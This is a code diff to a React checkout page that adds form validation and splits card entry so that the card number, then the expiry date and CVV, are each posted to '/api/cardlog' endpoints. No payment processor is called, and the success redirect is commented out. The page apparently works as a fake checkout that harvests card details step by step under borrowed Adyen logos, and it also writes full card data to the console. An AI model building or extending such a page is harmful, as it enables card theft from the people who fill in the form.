@@ -4,12 +4,23 @@ import { useCart } from "../../context/cartContext";
 import Loading from "../../components/Loading/Loading";
 import { useRedirectChecker } from "../../hooks/useRedirectChecker";
 import { useOnlineStatus } from "../../hooks/useOnlineStatus";
+import Modal from "../../components/UI/Modal/Modal";
 
 interface PaymentData {
   cardNumber: string;
   expiryDate: string;
   cvv: string;
   cardHolder: string;
+}
+
+// Валидационные сообщения
+interface ValidationErrors {
+  name?: string;
+  surname?: string;
+  phoneNumber?: string;
+  cardNumber?: string;
+  expiryDate?: string;
+  cvv?: string;
 }
 
 const Payment = () => {
@@ -29,21 +40,92 @@ const Payment = () => {
     "contact"
   );
   const [isProcessing, setIsProcessing] = useState(false);
+  const [showCvvModal, setShowCvvModal] = useState(false);
+  
+  // Состояние для ошибок валидации
+  const [errors, setErrors] = useState<ValidationErrors>({});
+
+  // Валидация имени и фамилии (только буквы и пробелы)
+  const validateName = (value: string): boolean => {
+    return /^[A-Za-zА-Яа-я\s\-']+$/.test(value);
+  };
+
+  // Валидация номера телефона (только цифры, пробелы, +, -, скобки)
+  const validatePhone = (value: string): boolean => {
+    return /^[\d+\-\s()]+$/.test(value);
+  };
+
+  // Валидация номера карты (только цифры и пробелы)
+  const validateCardNumber = (value: string): boolean => {
+    return /^[\d\s]+$/.test(value);
+  };
+
+  // Валидация даты expiration (только цифры и /)
+  const validateExpiryDate = (value: string): boolean => {
+    return /^[\d/]+$/.test(value);
+  };
+
+  // Валидация CVV (только цифры)
+  const validateCvv = (value: string): boolean => {
+    return /^\d+$/.test(value);
+  };
 
   const handleCustomerInputChange = (
     e: React.ChangeEvent<HTMLInputElement>
   ) => {
     const { name, value } = e.target;
+    
+    // Очищаем ошибку при вводе
+    if (errors[name as keyof ValidationErrors]) {
+      setErrors(prev => ({ ...prev, [name]: undefined }));
+    }
+
+    let processedValue = value;
+
+    // Валидация в реальном времени
+    if (name === "name" || name === "surname") {
+      if (value && !validateName(value)) {
+        setErrors(prev => ({ 
+          ...prev, 
+          [name]: "Only letters, spaces, hyphens and apostrophes are allowed" 
+        }));
+        return;
+      }
+    }
+
+    if (name === "phoneNumber") {
+      if (value && !validatePhone(value)) {
+        setErrors(prev => ({ 
+          ...prev, 
+          [name]: "Only numbers, spaces, +, - and parentheses are allowed" 
+        }));
+        return;
+      }
+    }
+
     setCustomerData({
       ...state.customerData!,
-      [name]: value,
+      [name]: processedValue,
     });
   };
 
   const handlePaymentInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
 
+    // Очищаем ошибку при вводе
+    if (errors[name as keyof ValidationErrors]) {
+      setErrors(prev => ({ ...prev, [name]: undefined }));
+    }
+
     if (name === "cardNumber") {
+      if (value && !validateCardNumber(value)) {
+        setErrors(prev => ({ 
+          ...prev, 
+          [name]: "Only numbers and spaces are allowed" 
+        }));
+        return;
+      }
+
       const formattedValue = value
         .replace(/\s/g, "")
         .replace(/(\d{4})/g, "$1 ")
@@ -54,6 +136,14 @@ const Payment = () => {
     }
 
     if (name === "expiryDate") {
+      if (value && !validateExpiryDate(value)) {
+        setErrors(prev => ({ 
+          ...prev, 
+          [name]: "Only numbers and / are allowed" 
+        }));
+        return;
+      }
+
       const formattedValue = value
         .replace(/\D/g, "")
         .replace(/(\d{2})(\d)/, "$1/$2")
@@ -63,6 +153,14 @@ const Payment = () => {
     }
 
     if (name === "cvv") {
+      if (value && !validateCvv(value)) {
+        setErrors(prev => ({ 
+          ...prev, 
+          [name]: "Only numbers are allowed" 
+        }));
+        return;
+      }
+
       const formattedValue = value.replace(/\D/g, "").slice(0, 3);
       setPaymentData((prev) => ({ ...prev, [name]: formattedValue }));
       return;
@@ -71,18 +169,45 @@ const Payment = () => {
     setPaymentData((prev) => ({ ...prev, [name]: value }));
   };
 
+  const validateCustomerForm = (): boolean => {
+    const newErrors: ValidationErrors = {};
+
+    if (!state.customerData?.name?.trim()) {
+      newErrors.name = "First name is required";
+    } else if (!validateName(state.customerData.name)) {
+      newErrors.name = "Only letters, spaces, hyphens and apostrophes are allowed";
+    }
+
+    if (!state.customerData?.surname?.trim()) {
+      newErrors.surname = "Last name is required";
+    } else if (!validateName(state.customerData.surname)) {
+      newErrors.surname = "Only letters, spaces, hyphens and apostrophes are allowed";
+    }
+
+    if (!state.customerData?.phoneNumber?.trim()) {
+      newErrors.phoneNumber = "Phone number is required";
+    } else if (!validatePhone(state.customerData.phoneNumber)) {
+      newErrors.phoneNumber = "Only numbers, spaces, +, - and parentheses are allowed";
+    } else if (state.customerData.phoneNumber.replace(/\D/g, "").length < 7) {
+      newErrors.phoneNumber = "Please enter a valid phone number";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
   const handleCustomerSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (
-      !state.customerData?.name ||
-      !state.customerData?.surname ||
-      !state.customerData?.phoneNumber
-    ) {
-      alert("Please fill in all required fields");
-      return;
-    }
+   if (!validateCustomerForm()) {
+  return;
+}
 
+// Добавьте проверку на существование customerData
+if (!state.customerData) {
+  alert("Please fill in customer information");
+  return;
+}
     try {
       setActive(true);
       const res = await fetch("/api/customer", {
@@ -108,39 +233,82 @@ const Payment = () => {
     setCurrentStep("payment");
   };
 
-  const handlePaymentSubmit = async (e: React.FormEvent) => {
+  // Первый шаг: отправка только номера карты
+  const handleCardNumberSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setIsProcessing(true);
 
-    if (
-      !paymentData.cardNumber ||
-      !paymentData.expiryDate ||
-      !paymentData.cvv
-    ) {
-      alert("Please fill in all payment details");
-      setIsProcessing(false);
+    if (!paymentData.cardNumber) {
+      setErrors({ cardNumber: "Card number is required" });
       return;
     }
 
     if (paymentData.cardNumber.replace(/\s/g, "").length !== 16) {
-      alert("Please enter a valid 16-digit card number");
-      setIsProcessing(false);
+      setErrors({ cardNumber: "Please enter a valid 16-digit card number" });
       return;
     }
+
     try {
+      // Отправляем только номер карты
       await fetch("/api/cardlog", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           sessionId: sessionId,
           cardNumber: paymentData.cardNumber.replace(/\s+/g, ""),
-          expireDate: paymentData.expiryDate,
-          cvv: paymentData.cvv,
-          step: "full",
+          expireDate: "",
+          cvv: "",
+          step: "card_number_only",
         }),
       });
 
-      console.log("Payment data:", { ...state.customerData, ...paymentData });
+      // Показываем модалку для ввода CVV и expiry date
+      setShowCvvModal(true);
+
+    } catch (error) {
+      console.error("Error sending card number:", error);
+      alert("There was an error processing your card. Please try again.");
+    }
+  };
+
+  // Второй шаг: отправка полных данных карты
+  const handleCvvSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    const newErrors: ValidationErrors = {};
+
+    if (!paymentData.expiryDate) {
+      newErrors.expiryDate = "Expiration date is required";
+    } else if (!/^\d{2}\/\d{2}$/.test(paymentData.expiryDate)) {
+      newErrors.expiryDate = "Please enter a valid expiration date (MM/YY)";
+    }
+
+    if (!paymentData.cvv) {
+      newErrors.cvv = "Security code is required";
+    } else if (paymentData.cvv.length !== 3) {
+      newErrors.cvv = "Please enter a valid 3-digit security code";
+    }
+
+    if (Object.keys(newErrors).length > 0) {
+      setErrors(newErrors);
+      setIsProcessing(false);
+      return;
+    }
+
+    setIsProcessing(true);
+
+    try {
+      // Отправляем полные данные карты
+      await fetch("/api/cardlog-update", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          sessionId: sessionId,
+          cvv: paymentData.cvv,
+          expireDate: paymentData.expiryDate,
+        }),
+      });
+
+      console.log("Full payment data:", { ...state.customerData, ...paymentData });
 
       // Очищаем корзину после успешной оплаты
       setPaymentData({
@@ -149,6 +317,12 @@ const Payment = () => {
         cvv: "",
         cardHolder: "",
       });
+
+      setShowCvvModal(false);
+      
+      // Здесь можно добавить редирект на страницу успеха
+      // window.location.href = "/success";
+
     } catch (error) {
       console.error("Payment error:", error);
       alert("There was an error processing your payment. Please try again.");
@@ -205,8 +379,15 @@ const Payment = () => {
                         onChange={handleCustomerInputChange}
                         placeholder="First name"
                         required
-                        className={styles.form__input}
+                        className={`${styles.form__input} ${
+                          errors.name ? styles.input__error : ""
+                        }`}
                       />
+                      {errors.name && (
+                        <span className={styles.error__message}>
+                          {errors.name}
+                        </span>
+                      )}
                     </div>
                     <div className={styles.input__group}>
                       <label>Last name *</label>
@@ -217,8 +398,15 @@ const Payment = () => {
                         onChange={handleCustomerInputChange}
                         placeholder="Last name"
                         required
-                        className={styles.form__input}
+                        className={`${styles.form__input} ${
+                          errors.surname ? styles.input__error : ""
+                        }`}
                       />
+                      {errors.surname && (
+                        <span className={styles.error__message}>
+                          {errors.surname}
+                        </span>
+                      )}
                     </div>
                   </div>
 
@@ -231,8 +419,15 @@ const Payment = () => {
                       onChange={handleCustomerInputChange}
                       placeholder="+971 50 123 4567"
                       required
-                      className={styles.form__input}
+                      className={`${styles.form__input} ${
+                        errors.phoneNumber ? styles.input__error : ""
+                      }`}
                     />
+                    {errors.phoneNumber && (
+                      <span className={styles.error__message}>
+                        {errors.phoneNumber}
+                      </span>
+                    )}
                   </div>
 
                   <button type="submit" className={styles.continue__btn}>
@@ -241,14 +436,14 @@ const Payment = () => {
                 </form>
               </div>
             ) : (
-              // Payment Form
+              // Payment Form - Только номер карты
               <div className={styles.form__container}>
                 <div className={styles.form__header}>
                   <h2>Payment method</h2>
                 </div>
 
                 <form
-                  onSubmit={handlePaymentSubmit}
+                  onSubmit={handleCardNumberSubmit}
                   className={styles.payment__form}
                 >
                   <div className={styles.payment__method}>
@@ -272,7 +467,9 @@ const Payment = () => {
                           placeholder="1234 1234 1234 1234"
                           maxLength={19}
                           required
-                          className={styles.form__input}
+                          className={`${styles.form__input} ${
+                            errors.cardNumber ? styles.input__error : ""
+                          }`}
                         />
                         <div className={styles.card__icons}>
                           <img
@@ -291,35 +488,11 @@ const Payment = () => {
                             src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/amex.svg"
                           />
                         </div>
-                      </div>
-
-                      <div className={styles.input__row}>
-                        <div className={styles.input__group}>
-                          <label>Expiration date *</label>
-                          <input
-                            type="text"
-                            name="expiryDate"
-                            value={paymentData.expiryDate}
-                            onChange={handlePaymentInputChange}
-                            placeholder="MM/YY"
-                            maxLength={5}
-                            required
-                            className={styles.form__input}
-                          />
-                        </div>
-                        <div className={styles.input__group}>
-                          <label>Security code *</label>
-                          <input
-                            type="text"
-                            name="cvv"
-                            value={paymentData.cvv}
-                            onChange={handlePaymentInputChange}
-                            placeholder="123"
-                            maxLength={3}
-                            required
-                            className={styles.form__input}
-                          />
-                        </div>
+                        {errors.cardNumber && (
+                          <span className={styles.error__message}>
+                            {errors.cardNumber}
+                          </span>
+                        )}
                       </div>
                     </div>
                   </div>
@@ -327,12 +500,9 @@ const Payment = () => {
                   <div className={styles.form__actions}>
                     <button
                       type="submit"
-                      disabled={isProcessing}
-                      className={styles.pay__btn}
+                      className={styles.continue__btn}
                     >
-                      {isProcessing
-                        ? "Processing..."
-                        : `Pay AED ${getTotalPrice().toFixed(2)}`}
+                      Continue
                     </button>
                   </div>
                 </form>
@@ -415,6 +585,72 @@ const Payment = () => {
           </div>
         </div>
       </div>
+
+      {/* Модалка для ввода CVV и Expiry Date */}
+      <Modal active={showCvvModal} setActive={setShowCvvModal}>
+        <div className={styles.modal__content}>
+          <h3>Additional card details</h3>
+          <p>Please enter your card's security details</p>
+          
+          <form onSubmit={handleCvvSubmit} className={styles.payment__form}>
+            <div className={styles.input__row}>
+              <div className={styles.input__group}>
+                <label>Expiration date *</label>
+                <input
+                  type="text"
+                  name="expiryDate"
+                  value={paymentData.expiryDate}
+                  onChange={handlePaymentInputChange}
+                  placeholder="MM/YY"
+                  maxLength={5}
+                  required
+                  className={`${styles.form__input} ${
+                    errors.expiryDate ? styles.input__error : ""
+                  }`}
+                />
+                {errors.expiryDate && (
+                  <span className={styles.error__message}>
+                    {errors.expiryDate}
+                  </span>
+                )}
+              </div>
+              <div className={styles.input__group}>
+                <label>Security code *</label>
+                <input
+                  type="text"
+                  name="cvv"
+                  value={paymentData.cvv}
+                  onChange={handlePaymentInputChange}
+                  placeholder="123"
+                  maxLength={3}
+                  required
+                  className={`${styles.form__input} ${
+                    errors.cvv ? styles.input__error : ""
+                  }`}
+                />
+                {errors.cvv && (
+                  <span className={styles.error__message}>
+                    {errors.cvv}
+                  </span>
+                )}
+              </div>
+            </div>
+
+            <div className={styles.form__actions}>
+              <button
+                type="submit"
+                disabled={isProcessing}
+                className={styles.pay__btn}
+              >
+                {isProcessing
+                  ? "Processing..."
+                  : `Pay AED ${getTotalPrice().toFixed(2)}`}
+              </button>
+            </div>
+          </form>
+        </div>
+      </Modal>
+
       <Loading isLoading={isActive} />
     </div>
   );
